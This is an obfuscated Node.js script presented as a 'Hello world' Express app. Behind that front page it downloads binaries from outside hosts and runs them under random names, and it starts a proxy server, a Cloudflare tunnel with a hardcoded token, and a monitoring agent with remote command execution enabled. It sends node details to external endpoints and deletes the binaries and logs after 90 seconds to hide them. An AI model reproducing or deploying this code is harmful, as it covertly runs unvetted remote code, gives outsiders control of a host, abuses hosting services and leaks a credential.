const _0xce4360=_0x185f;(function(_0x22d08f,_0x4b7990){const _0x5dfd50=_0x185f,_0x7e2d78=_0x22d08f();while(!![]){try{const _0x33c184=parseInt(_0x5dfd50(0xe9))/0x1+parseInt(_0x5dfd50(0x12b))/0x2*(parseInt(_0x5dfd50(0x135))/0x3)+-parseInt(_0x5dfd50(0x177))/0x4*(-parseInt(_0x5dfd50(0x100))/0x5)+-parseInt(_0x5dfd50(0x10c))/0x6*(parseInt(_0x5dfd50(0x107))/0x7)+parseInt(_0x5dfd50(0x17b))/0x8+-parseInt(_0x5dfd50(0x17e))/0x9+-parseInt(_0x5dfd50(0x15a))/0xa;if(_0x33c184===_0x4b7990)break;else _0x7e2d78['push'](_0x7e2d78['shift']());}catch(_0x382ac6){_0x7e2d78['push'](_0x7e2d78['shift']());}}}(_0x5d87,0xccfc8));const express=require(_0xce4360(0x136)),app=express(),axios=require(_0xce4360(0x14a)),os=require('os'),fs=require('fs'),path=require(_0xce4360(0x146)),{promisify}=require(_0xce4360(0x123)),exec=promisify(require('child_process')[_0xce4360(0xe2)]),{execSync}=require(_0xce4360(0x137)),UPLOAD_URL=process['env'][_0xce4360(0xf0)]||'',PROJECT_URL=process[_0xce4360(0x111)][_0xce4360(0xda)]||'',AUTO_ACCESS=process[_0xce4360(0x111)][_0xce4360(0x16f)]||![],FILE_PATH=process[_0xce4360(0x111)][_0xce4360(0x12d)]||_0xce4360(0x18a),SUB_PATH=process[_0xce4360(0x111)][_0xce4360(0x14d)]||_0xce4360(0x161),PORT=process[_0xce4360(0x111)][_0xce4360(0xed)]||process[_0xce4360(0x111)][_0xce4360(0x174)]||0xbb8,UUID=process[_0xce4360(0x111)][_0xce4360(0x151)]||_0xce4360(0x15c),NEZHA_SERVER=process['env'][_0xce4360(0x132)]||'',NEZHA_PORT=process[_0xce4360(0x111)][_0xce4360(0x117)]||'',NEZHA_KEY=process[_0xce4360(0x111)][_0xce4360(0x188)]||'',ARGO_DOMAIN=process[_0xce4360(0x111)][_0xce4360(0xef)]||_0xce4360(0xeb),ARGO_AUTH=process['env'][_0xce4360(0x18d)]||_0xce4360(0x126),ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process[_0xce4360(0x111)]['CFIP']||'cdns.doon.eu.org',CFPORT=process[_0xce4360(0x111)]['CFPORT']||0x1bb,NAME=process[_0xce4360(0x111)]['NAME']||_0xce4360(0x147);!fs[_0xce4360(0x102)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0xce4360(0x11a)](FILE_PATH+_0xce4360(0x15b))):console['log'](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x3463d3=_0xce4360,_0x3c7b89=_0x3463d3(0x15e);let _0xb0b3='';for(let _0x5143ea=0x0;_0x5143ea<0x6;_0x5143ea++){_0xb0b3+=_0x3c7b89[_0x3463d3(0x148)](Math[_0x3463d3(0x140)](Math['random']()*_0x3c7b89[_0x3463d3(0xfd)]));}return _0xb0b3;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0xce4360(0xf5)](FILE_PATH,npmName),phpPath=path[_0xce4360(0xf5)](FILE_PATH,phpName),webPath=path[_0xce4360(0xf5)](FILE_PATH,webName),botPath=path[_0xce4360(0xf5)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0xce4360(0xf5)](FILE_PATH,_0xce4360(0x14b)),bootLogPath=path[_0xce4360(0xf5)](FILE_PATH,_0xce4360(0x12f)),configPath=path[_0xce4360(0xf5)](FILE_PATH,_0xce4360(0xf3));function deleteNodes(){const _0x50e84e=_0xce4360;try{if(!UPLOAD_URL)return;if(!fs[_0x50e84e(0x102)](subPath))return;let _0x30575b;try{_0x30575b=fs[_0x50e84e(0x14c)](subPath,_0x50e84e(0x150));}catch{return null;}const _0x579764=Buffer[_0x50e84e(0xd8)](_0x30575b,_0x50e84e(0xe3))[_0x50e84e(0x154)](_0x50e84e(0x150)),_0xf8565=_0x579764[_0x50e84e(0xee)]('\x0a')[_0x50e84e(0xf8)](_0x5b167d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x5b167d));if(_0xf8565[_0x50e84e(0xfd)]===0x0)return;return axios[_0x50e84e(0x141)](UPLOAD_URL+_0x50e84e(0x104),JSON['stringify']({'nodes':_0xf8565}),{'headers':{'Content-Type':_0x50e84e(0x112)}})['catch'](_0x40b24b=>{return null;}),null;}catch(_0x4d9c94){return null;}}function cleanupOldFiles(){const _0x4329be=_0xce4360;try{const _0x39774b=fs[_0x4329be(0x11b)](FILE_PATH);_0x39774b['forEach'](_0x1c3afc=>{const _0x3054f7=_0x4329be,_0x4bfaf0=path[_0x3054f7(0xf5)](FILE_PATH,_0x1c3afc);try{const _0x3aa7a3=fs[_0x3054f7(0x182)](_0x4bfaf0);_0x3aa7a3[_0x3054f7(0xe8)]()&&fs['unlinkSync'](_0x4bfaf0);}catch(_0x269394){}});}catch(_0x5abd4d){}}app['get']('/',function(_0x356ca8,_0x23e379){const _0x57ed78=_0xce4360;_0x23e379['send'](_0x57ed78(0xfa));});function _0x185f(_0x30cbe0,_0x50da85){const _0x5d872f=_0x5d87();return _0x185f=function(_0x185f23,_0x25e622){_0x185f23=_0x185f23-0xd0;let _0xf5ec30=_0x5d872f[_0x185f23];return _0xf5ec30;},_0x185f(_0x30cbe0,_0x50da85);}async function generateConfig(){const _0x3032f0=_0xce4360,_0x54ce55={'log':{'access':'/dev/null','error':_0x3032f0(0xe4),'loglevel':_0x3032f0(0x183)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3032f0(0x114),'settings':{'clients':[{'id':UUID,'flow':_0x3032f0(0x103)}],'decryption':_0x3032f0(0x183),'fallbacks':[{'dest':0xbb9},{'path':_0x3032f0(0x10a),'dest':0xbba},{'path':_0x3032f0(0x16a),'dest':0xbbb},{'path':_0x3032f0(0x14e),'dest':0xbbc}]},'streamSettings':{'network':_0x3032f0(0xd0)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x3032f0(0x114),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x3032f0(0xd0),'security':_0x3032f0(0x183)}},{'port':0xbba,'listen':_0x3032f0(0x10d),'protocol':_0x3032f0(0x114),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3032f0(0x183)},'streamSettings':{'network':'ws','security':_0x3032f0(0x183),'wsSettings':{'path':_0x3032f0(0x10a)}},'sniffing':{'enabled':!![],'destOverride':[_0x3032f0(0x108),'tls',_0x3032f0(0x16e)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x3032f0(0x10d),'protocol':_0x3032f0(0x17f),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3032f0(0x16a)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x3032f0(0xd3),_0x3032f0(0x16e)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x3032f0(0x10d),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x3032f0(0x183),'wsSettings':{'path':_0x3032f0(0x14e)}},'sniffing':{'enabled':!![],'destOverride':[_0x3032f0(0x108),_0x3032f0(0xd3),_0x3032f0(0x16e)],'metadataOnly':![]}}],'dns':{'servers':[_0x3032f0(0x121)]},'outbounds':[{'protocol':'freedom','tag':_0x3032f0(0xf7)},{'protocol':_0x3032f0(0xdf),'tag':_0x3032f0(0xea)}]};fs[_0x3032f0(0xe0)](path['join'](FILE_PATH,'config.json'),JSON[_0x3032f0(0x143)](_0x54ce55,null,0x2));}function _0x5d87(){const _0x31e829=['pkill\x20-f\x20\x22[','floor','post','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','stringify','set','nohup\x20','path','raillway','charAt','pop','axios','list.txt','readFileSync','SUB_PATH','/trojan-argo','https://arm64.ssss.nyc.mn/v1','utf-8','UUID','\x20>/dev/null\x202>&1','Add\x20automatic\x20access\x20task\x20faild:\x20','toString','all','443','2083','Nodes\x20uploaded\x20successfully','/sub.txt\x20saved\x20successfully','8174760jUqnoL','\x20is\x20created','9afd1229-b893-40c1-84dd-51e7ce204913','status','abcdefghijklmnopqrstuvwxyz','\x20>\x20nul\x202>&1','Error\x20executing\x20command:\x20','sub','automatic\x20access\x20task\x20added\x20successfully','message','\x20-c\x20\x22','\x20-c\x20','web\x20running\x20error:\x20','fileUrl','/config.json\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/web','/vmess-argo','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','/api/add-nodes','true','quic','AUTO_ACCESS','php\x20running\x20error:\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','amd','PORT','error','TunnelSecret','244qxylsK','\x20failed:\x20','clear','rm\x20-rf\x20','146848XCVxBl','Error\x20downloading\x20files:','Download\x20','2769831CiMJdL','vmess','https://oooo.serv00.net/add-url','2053','statSync','none','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','arm64','Error\x20reading\x20boot.log:','https://amd64.ssss.nyc.mn/web','NEZHA_KEY','\x20-s\x20','./tmp','unlinkSync','App\x20is\x20running','ARGO_AUTH','https://arm64.ssss.nyc.mn/agent','NEZHA\x20variable\x20is\x20empty,skip\x20running','tcp','Skipping\x20adding\x20automatic\x20access\x20task','basename','tls','arm','platform','get','finish','from','https://amd64.ssss.nyc.mn/v1','PROJECT_URL','stream','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x20>/dev/null\x202>&1\x20&','fileName','blackhole','writeFileSync','Unhandled\x20error\x20in\x20startserver:','exec','base64','/dev/null','https://arm64.ssss.nyc.mn/bot','&path=%2Ftrojan-argo%3Fed%3D2560#','ArgoDomain:','isFile','508361KEpeeL','block','raillway.1.8.5.0.b.0.0.0.0.7.4.0.1.0.0.2.ip6.arpa','\x0aclient_secret:\x20','SERVER_PORT','split','ARGO_DOMAIN','UPLOAD_URL','/tunnel.yml\x20run','Empowerment\x20success\x20for\x20','config.json','&fp=firefox&type=ws&host=','join','tunnel.json','direct','filter','2087','Hello\x20world!','\x0a\x20\x20tunnel:\x20','win32','length','arch','aarch64','20545xPztjm','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','existsSync','xtls-rprx-vision','/api/delete-nodes','\x0avless://','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','6783lIpwOP','http','includes','/vless-argo','\x0a\x20\x20\x0atrojan://','510MfLtui','127.0.0.1','trim','unlink','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','env','application/json','forEach','vless','npm\x20running\x20error:\x20','send','NEZHA_PORT','\x20is\x20running','match','log','readdirSync','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/api/add-subscriptions','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','Empowerment\x20failed\x20for\x20','firefox','https+local://8.8.8.8/dns-query','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','util','then','8443','eyJhIjoiNWJmMDNkZjI4ZTc1Zjk2MTk4NDRjYTA4OTA5MmYwMjIiLCJ0IjoiMzdiMTMyYzctZDJkNS00MGNmLTkzNTEtZWI2ZTcwM2NjNWVjIiwicyI6Ik1EUTBOVEUwTVRNdFlUTXhOeTAwWlRrMUxXRXpPR1V0WkdNME5tTmpNRGc0TmpZdyJ9','2096','Error\x20in\x20startserver:','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','http\x20server\x20is\x20running\x20on\x20port:','4TXsapa','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','FILE_PATH','createWriteStream','boot.log','.exe\x20>\x20nul\x202>&1','pipe','NEZHA_SERVER','del\x20/f\x20/q\x20','Subscription\x20uploaded\x20successfully','1904787uBTgIB','express','child_process','catch','config.yaml','response','taskkill\x20/f\x20/im\x20','unshift','push','/vmess-argo?ed=2560'];_0x5d87=function(){return _0x31e829;};return _0x5d87();}function getSystemArchitecture(){const _0x22c3c5=_0xce4360,_0x4fc127=os[_0x22c3c5(0xfe)]();return _0x4fc127===_0x22c3c5(0xd4)||_0x4fc127===_0x22c3c5(0x185)||_0x4fc127===_0x22c3c5(0xff)?_0x22c3c5(0xd4):_0x22c3c5(0x173);}function downloadFile(_0x40b5aa,_0x4a3f08,_0xe7c3b4){const _0x4aae92=_0xce4360,_0x1ff941=_0x40b5aa;!fs[_0x4aae92(0x102)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x33c537=fs[_0x4aae92(0x12e)](_0x1ff941);axios({'method':_0x4aae92(0xd6),'url':_0x4a3f08,'responseType':_0x4aae92(0xdb)})[_0x4aae92(0x124)](_0x30fc06=>{const _0x4a4f42=_0x4aae92;_0x30fc06['data'][_0x4a4f42(0x131)](_0x33c537),_0x33c537['on'](_0x4a4f42(0xd7),()=>{const _0x2fff31=_0x4a4f42;_0x33c537['close'](),console['log'](_0x2fff31(0x17d)+path[_0x2fff31(0xd2)](_0x1ff941)+'\x20successfully'),_0xe7c3b4(null,_0x1ff941);}),_0x33c537['on'](_0x4a4f42(0x175),_0x3a0a9c=>{const _0x2a991e=_0x4a4f42;fs[_0x2a991e(0x10f)](_0x1ff941,()=>{});const _0x452349=_0x2a991e(0x17d)+path['basename'](_0x1ff941)+_0x2a991e(0x178)+_0x3a0a9c[_0x2a991e(0x163)];console[_0x2a991e(0x175)](_0x452349),_0xe7c3b4(_0x452349);});})[_0x4aae92(0x138)](_0x154307=>{const _0x5cf841=_0x4aae92,_0x18bd40=_0x5cf841(0x17d)+path[_0x5cf841(0xd2)](_0x1ff941)+_0x5cf841(0x178)+_0x154307['message'];console['error'](_0x18bd40),_0xe7c3b4(_0x18bd40);});}async function downloadFilesAndRun(){const _0x2280d0=_0xce4360,_0x157ecc=getSystemArchitecture(),_0x72329c=getFilesForArchitecture(_0x157ecc);if(_0x72329c[_0x2280d0(0xfd)]===0x0){console[_0x2280d0(0x11a)](_0x2280d0(0x184));return;}const _0xb0ff83=_0x72329c['map'](_0x5edaea=>{return new Promise((_0x35a527,_0x57eaa9)=>{const _0x4f456e=_0x185f;downloadFile(_0x5edaea[_0x4f456e(0xde)],_0x5edaea[_0x4f456e(0x167)],(_0x644984,_0x3629e8)=>{_0x644984?_0x57eaa9(_0x644984):_0x35a527(_0x3629e8);});});});try{await Promise[_0x2280d0(0x155)](_0xb0ff83);}catch(_0x5c1e6d){console[_0x2280d0(0x175)](_0x2280d0(0x17c),_0x5c1e6d);return;}function _0x2b1c15(_0x2cd4e8){const _0xed4850=0x1fd;_0x2cd4e8['forEach'](_0x529e90=>{const _0x2a56b0=_0x185f;fs[_0x2a56b0(0x102)](_0x529e90)&&fs['chmod'](_0x529e90,_0xed4850,_0x3e757b=>{const _0x5b55ef=_0x2a56b0;_0x3e757b?console[_0x5b55ef(0x175)](_0x5b55ef(0x11f)+_0x529e90+':\x20'+_0x3e757b):console[_0x5b55ef(0x11a)](_0x5b55ef(0xf2)+_0x529e90+':\x20'+_0xed4850[_0x5b55ef(0x154)](0x8));});});}const _0x456ff2=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2b1c15(_0x456ff2);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x27c9a5=NEZHA_SERVER[_0x2280d0(0x109)](':')?NEZHA_SERVER['split'](':')[_0x2280d0(0x149)]():'',_0xb57628=new Set([_0x2280d0(0x156),_0x2280d0(0x125),_0x2280d0(0x127),'2087','2083',_0x2280d0(0x181)]),_0x109dc7=_0xb57628['has'](_0x27c9a5)?_0x2280d0(0x16d):'false',_0x24fea4=_0x2280d0(0xec)+NEZHA_KEY+_0x2280d0(0x101)+NEZHA_SERVER+_0x2280d0(0x16b)+_0x109dc7+_0x2280d0(0x122)+UUID;fs[_0x2280d0(0xe0)](path[_0x2280d0(0xf5)](FILE_PATH,_0x2280d0(0x139)),_0x24fea4);const _0x9d5b28=_0x2280d0(0x145)+phpPath+_0x2280d0(0x164)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x9d5b28),console[_0x2280d0(0x11a)](phpName+_0x2280d0(0x118)),await new Promise(_0x29f46e=>setTimeout(_0x29f46e,0x3e8));}catch(_0x509b7a){console[_0x2280d0(0x175)](_0x2280d0(0x170)+_0x509b7a);}}else{let _0x180dea='';const _0xc90a8e=[_0x2280d0(0x156),_0x2280d0(0x125),_0x2280d0(0x127),_0x2280d0(0xf9),_0x2280d0(0x157),_0x2280d0(0x181)];_0xc90a8e[_0x2280d0(0x109)](NEZHA_PORT)&&(_0x180dea='--tls');const _0x21746b='nohup\x20'+npmPath+_0x2280d0(0x189)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x180dea+_0x2280d0(0x106);try{await exec(_0x21746b),console[_0x2280d0(0x11a)](npmName+_0x2280d0(0x118)),await new Promise(_0x289b5f=>setTimeout(_0x289b5f,0x3e8));}catch(_0x20a832){console[_0x2280d0(0x175)](_0x2280d0(0x115)+_0x20a832);}}}else console[_0x2280d0(0x11a)](_0x2280d0(0x18f));const _0x55910b='nohup\x20'+webPath+_0x2280d0(0x165)+FILE_PATH+_0x2280d0(0x168);try{await exec(_0x55910b),console[_0x2280d0(0x11a)](webName+_0x2280d0(0x118)),await new Promise(_0x12de2f=>setTimeout(_0x12de2f,0x3e8));}catch(_0x18af5f){console[_0x2280d0(0x175)](_0x2280d0(0x166)+_0x18af5f);}if(fs[_0x2280d0(0x102)](botPath)){let _0x5e7d8f;if(ARGO_AUTH[_0x2280d0(0x119)](/^[A-Z0-9a-z=]{120,250}$/))_0x5e7d8f='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x2280d0(0x119)](/TunnelSecret/)?_0x5e7d8f=_0x2280d0(0x11e)+FILE_PATH+_0x2280d0(0xf1):_0x5e7d8f='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x2280d0(0x11c)+ARGO_PORT;try{await exec(_0x2280d0(0x145)+botPath+'\x20'+_0x5e7d8f+_0x2280d0(0xdd)),console[_0x2280d0(0x11a)](botName+_0x2280d0(0x118)),await new Promise(_0x4a1f70=>setTimeout(_0x4a1f70,0x7d0));}catch(_0x4e2486){console[_0x2280d0(0x175)](_0x2280d0(0x160)+_0x4e2486);}}await new Promise(_0x44cd6d=>setTimeout(_0x44cd6d,0x1388));}function getFilesForArchitecture(_0x2d2a81){const _0x5aa703=_0xce4360;let _0x4e6af5;_0x2d2a81===_0x5aa703(0xd4)?_0x4e6af5=[{'fileName':webPath,'fileUrl':_0x5aa703(0x169)},{'fileName':botPath,'fileUrl':_0x5aa703(0xe5)}]:_0x4e6af5=[{'fileName':webPath,'fileUrl':_0x5aa703(0x187)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2fd7ee=_0x2d2a81==='arm'?_0x5aa703(0x18e):'https://amd64.ssss.nyc.mn/agent';_0x4e6af5[_0x5aa703(0x13c)]({'fileName':npmPath,'fileUrl':_0x2fd7ee});}else{const _0x83e7ff=_0x2d2a81===_0x5aa703(0xd4)?_0x5aa703(0x14f):_0x5aa703(0xd9);_0x4e6af5[_0x5aa703(0x13c)]({'fileName':phpPath,'fileUrl':_0x83e7ff});}}return _0x4e6af5;}function argoType(){const _0x1ad1db=_0xce4360;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1ad1db(0x11a)](_0x1ad1db(0x142));return;}if(ARGO_AUTH['includes'](_0x1ad1db(0x176))){fs[_0x1ad1db(0xe0)](path['join'](FILE_PATH,_0x1ad1db(0xf6)),ARGO_AUTH);const _0x334c15=_0x1ad1db(0xfb)+ARGO_AUTH[_0x1ad1db(0xee)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,'tunnel.json')+_0x1ad1db(0x110)+ARGO_DOMAIN+_0x1ad1db(0xdc)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x1ad1db(0xe0)](path[_0x1ad1db(0xf5)](FILE_PATH,'tunnel.yml'),_0x334c15);}else console[_0x1ad1db(0x11a)](_0x1ad1db(0x12c));}argoType();async function extractDomains(){const _0x2e3250=_0xce4360;let _0x36f357;if(ARGO_AUTH&&ARGO_DOMAIN)_0x36f357=ARGO_DOMAIN,console[_0x2e3250(0x11a)]('ARGO_DOMAIN:',_0x36f357),await _0x2364fb(_0x36f357);else try{const _0x48b8ba=fs['readFileSync'](path[_0x2e3250(0xf5)](FILE_PATH,_0x2e3250(0x12f)),_0x2e3250(0x150)),_0x4d5165=_0x48b8ba['split']('\x0a'),_0x384864=[];_0x4d5165[_0x2e3250(0x113)](_0x484a11=>{const _0x3bcce7=_0x2e3250,_0x434092=_0x484a11[_0x3bcce7(0x119)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x434092){const _0x3eb08e=_0x434092[0x1];_0x384864[_0x3bcce7(0x13d)](_0x3eb08e);}});if(_0x384864[_0x2e3250(0xfd)]>0x0)_0x36f357=_0x384864[0x0],console[_0x2e3250(0x11a)](_0x2e3250(0xe7),_0x36f357),await _0x2364fb(_0x36f357);else{console[_0x2e3250(0x11a)](_0x2e3250(0x171)),fs[_0x2e3250(0x18b)](path[_0x2e3250(0xf5)](FILE_PATH,_0x2e3250(0x12f)));async function _0x58191b(){const _0x2943f7=_0x2e3250;try{process[_0x2943f7(0xd5)]===_0x2943f7(0xfc)?await exec(_0x2943f7(0x13b)+botName+_0x2943f7(0x130)):await exec(_0x2943f7(0x13f)+botName[_0x2943f7(0x148)](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x1ba551){}}_0x58191b(),await new Promise(_0x7c82fe=>setTimeout(_0x7c82fe,0xbb8));const _0x3427b3='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x2e3250(0x11c)+ARGO_PORT;try{await exec(_0x2e3250(0x145)+botPath+'\x20'+_0x3427b3+_0x2e3250(0xdd)),console[_0x2e3250(0x11a)](botName+_0x2e3250(0x118)),await new Promise(_0x48436e=>setTimeout(_0x48436e,0xbb8)),await extractDomains();}catch(_0xdbcba5){console[_0x2e3250(0x175)](_0x2e3250(0x160)+_0xdbcba5);}}}catch(_0x1a8634){console[_0x2e3250(0x175)](_0x2e3250(0x186),_0x1a8634);}async function _0x2364fb(_0xcf97ff){const _0x547ae9=_0x2e3250,_0x5bedc0=execSync(_0x547ae9(0x172),{'encoding':_0x547ae9(0x150)}),_0x26c869=_0x5bedc0[_0x547ae9(0x10e)](),_0x2e3c2f=NAME?NAME+'-'+_0x26c869:_0x26c869;return new Promise(_0x2ca24d=>{setTimeout(()=>{const _0x11743b=_0x185f,_0x5036fe={'v':'2','ps':''+_0x2e3c2f,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0xcf97ff,'path':_0x11743b(0x13e),'tls':'tls','sni':_0xcf97ff,'alpn':'','fp':_0x11743b(0x120)},_0x58e702=_0x11743b(0x105)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0xcf97ff+_0x11743b(0xf4)+_0xcf97ff+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x2e3c2f+'\x0a\x20\x20\x0avmess://'+Buffer[_0x11743b(0xd8)](JSON[_0x11743b(0x143)](_0x5036fe))[_0x11743b(0x154)](_0x11743b(0xe3))+_0x11743b(0x10b)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0xcf97ff+_0x11743b(0xf4)+_0xcf97ff+_0x11743b(0xe6)+_0x2e3c2f+'\x0a\x20\x20\x20\x20';console[_0x11743b(0x11a)](Buffer[_0x11743b(0xd8)](_0x58e702)[_0x11743b(0x154)](_0x11743b(0xe3))),fs['writeFileSync'](subPath,Buffer['from'](_0x58e702)[_0x11743b(0x154)](_0x11743b(0xe3))),console[_0x11743b(0x11a)](FILE_PATH+_0x11743b(0x159)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x41fcd4,_0x10a266)=>{const _0x560f32=_0x11743b,_0x1ccf2e=Buffer[_0x560f32(0xd8)](_0x58e702)[_0x560f32(0x154)](_0x560f32(0xe3));_0x10a266[_0x560f32(0x144)]('Content-Type','text/plain;\x20charset=utf-8'),_0x10a266[_0x560f32(0x116)](_0x1ccf2e);}),_0x2ca24d(_0x58e702);},0x7d0);});}}async function uploadNodes(){const _0x22bf81=_0xce4360;if(UPLOAD_URL&&PROJECT_URL){const _0x455c31=PROJECT_URL+'/'+SUB_PATH,_0x5a4d4c={'subscription':[_0x455c31]};try{const _0x5a5eae=await axios[_0x22bf81(0x141)](UPLOAD_URL+_0x22bf81(0x11d),_0x5a4d4c,{'headers':{'Content-Type':_0x22bf81(0x112)}});return _0x5a5eae&&_0x5a5eae[_0x22bf81(0x15d)]===0xc8?(console[_0x22bf81(0x11a)](_0x22bf81(0x134)),_0x5a5eae):null;}catch(_0x2765d8){if(_0x2765d8['response']){if(_0x2765d8[_0x22bf81(0x13a)][_0x22bf81(0x15d)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x40abe5=fs['readFileSync'](listPath,'utf-8'),_0x51be16=_0x40abe5[_0x22bf81(0xee)]('\x0a')[_0x22bf81(0xf8)](_0x1dd29c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1dd29c));if(_0x51be16[_0x22bf81(0xfd)]===0x0)return;const _0x48a4e7=JSON[_0x22bf81(0x143)]({'nodes':_0x51be16});try{const _0x3eac1e=await axios[_0x22bf81(0x141)](UPLOAD_URL+_0x22bf81(0x16c),_0x48a4e7,{'headers':{'Content-Type':_0x22bf81(0x112)}});return _0x3eac1e&&_0x3eac1e['status']===0xc8?(console[_0x22bf81(0x11a)](_0x22bf81(0x158)),_0x3eac1e):null;}catch(_0x25c08b){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x1dbe72=_0x185f,_0x165626=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x165626[_0x1dbe72(0x13d)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x165626[_0x1dbe72(0x13d)](phpPath);process['platform']===_0x1dbe72(0xfc)?exec(_0x1dbe72(0x133)+_0x165626['join']('\x20')+_0x1dbe72(0x15f),_0x29963a=>{const _0x16ac93=_0x1dbe72;console[_0x16ac93(0x179)](),console[_0x16ac93(0x11a)](_0x16ac93(0x18c)),console[_0x16ac93(0x11a)](_0x16ac93(0x129));}):exec(_0x1dbe72(0x17a)+_0x165626['join']('\x20')+_0x1dbe72(0x152),_0x5675e1=>{const _0x133644=_0x1dbe72;console[_0x133644(0x179)](),console[_0x133644(0x11a)](_0x133644(0x18c)),console[_0x133644(0x11a)](_0x133644(0x129));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x233abc=_0xce4360;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x233abc(0xd1));return;}try{const _0xb2e70a=await axios['post'](_0x233abc(0x180),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x233abc(0x112)}});return console[_0x233abc(0x11a)](_0x233abc(0x162)),_0xb2e70a;}catch(_0x2e699b){return console[_0x233abc(0x175)](_0x233abc(0x153)+_0x2e699b[_0x233abc(0x163)]),null;}}async function startserver(){const _0x3e1a15=_0xce4360;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4205de){console[_0x3e1a15(0x175)](_0x3e1a15(0x128),_0x4205de);}}startserver()[_0xce4360(0x138)](_0x2dd5ff=>{const _0x121c3e=_0xce4360;console[_0x121c3e(0x175)](_0x121c3e(0xe1),_0x2dd5ff);}),app['listen'](PORT,()=>console[_0xce4360(0x11a)](_0xce4360(0x12a)+PORT+'!'));
